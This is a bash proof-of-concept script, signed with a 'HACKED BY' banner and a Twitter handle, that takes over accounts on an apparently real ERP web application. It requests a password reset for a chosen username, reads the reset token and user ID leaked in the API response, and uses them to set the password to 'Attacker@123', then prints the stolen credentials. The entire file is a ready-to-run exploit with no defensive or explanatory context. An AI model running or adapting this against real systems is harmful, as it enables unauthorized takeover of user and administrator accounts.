#!/bin/bash
# Usage:
#   ./poc.sh <username> [target]
#
# Examples:
#   ./poc.sh admin
#   ./poc.sh TRUSTEE2
#   ./poc.sh 100001 https://example .com:8080

TARGET="${2:-https://example .com:8080}"
USERNAME="${1:-admin}"
NEWPASS="Attacker@123"

echo ""
echo "  ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ "
echo "  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗"
echo "  ███████║███████║██║     █████╔╝ █████╗  ██║  ██║"
echo "  ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║"
echo "  ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝"
echo "  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ "
echo ""
echo "  ██████╗ ██╗   ██╗    ███╗   ███╗██████╗  █████╗ ██╗██████╗ "
echo "  ██╔══██╗╚██╗ ██╔╝    ████╗ ████║██╔══██╗██╔══██╗██║██╔══██╗"
echo "  ██████╔╝ ╚████╔╝     ██╔████╔██║██║  ██║███████║██║██████╔╝"
echo "  ██╔══██╗  ╚██╔╝      ██║╚██╔╝██║██║  ██║██╔══██║██║██╔══██╗"
echo "  ██████╔╝   ██║       ██║ ╚═╝ ██║██████╔╝██║  ██║██║██║  ██║"
echo "  ╚═════╝    ╚═╝       ╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝"
echo ""
echo "  ┌─────────────────────────────────────────────────────┐"
echo "  │         Account Takeover via Password Reset         │"
echo "  │              Twitter: @mda1r                        │"
echo "  │                                                     │"
echo "  └─────────────────────────────────────────────────────┘"
echo ""
echo "  [*] Target  : $TARGET"
echo "  [*] Username: $USERNAME"
echo ""

# Step 1: Get reset token
echo "  [1] Requesting password reset token..."
RESP=$(curl -sk -X POST "$TARGET/erp_api/reset_password_api/" \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"$USERNAME\"}")

echo "  [~] Response: $RESP"

TOKEN=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['token_no'])" 2>/dev/null)
USER_UID=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['user_uid'])" 2>/dev/null)

if [ -z "$TOKEN" ]; then
  echo ""
  echo "  [-] Failed: user not found or unexpected response"
  exit 1
fi

echo "  [+] Token   : $TOKEN"
echo "  [+] User UID: $USER_UID"
echo ""

# Step 2: Reset password
echo "  [2] Resetting password to: $NEWPASS"
RESET=$(curl -sk -X POST "$TARGET/erp_api/password_reset_confirm_api/" \
  -H "Content-Type: application/json" \
  -d "{\"token_no\":\"$TOKEN\",\"user_uid\":\"$USER_UID\",\"new_password\":\"$NEWPASS\"}")

echo "  [~] Response: $RESET"
echo ""

# Step 3: Confirm
echo "  ╔══════════════════════════════════════════╗"
echo "  ║         ACCOUNT TAKEOVER SUCCESS         ║"
echo "  ╠══════════════════════════════════════════╣"
echo "  ║  Username : $USERNAME"
echo "  ║  Password : $NEWPASS"
echo "  ║  Login at : $TARGET/user/login/"
echo "  ╚══════════════════════════════════════════╝"
echo ""
